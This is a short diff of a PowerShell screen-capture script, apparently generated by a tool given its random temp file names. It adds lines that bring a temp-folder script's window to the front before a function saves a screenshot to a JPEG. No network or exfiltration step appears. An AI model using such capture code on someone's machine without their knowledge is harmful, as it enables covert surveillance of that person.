@@ -1,3 +1,5 @@
+$proc = Get-process | Where-Object {$_.path -eq "$env:temp/SbQRViPjIq.ps1"}
+[Microsoft.VisualBasic.Interaction]::AppActivate($Proc.id)
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
 
@@ -32,6 +34,7 @@ function Get-ScreenCapture
         # $bitmap.Save("${screenCapturePathBase}${c}.jpg", $jpegCodec, $ep)
         $bitmap.Save("cqTbMpzNLx.jpg", $jpegCodec, $ep)
     }
+
 }
 Write-Output "hi"
 Get-ScreenCapture
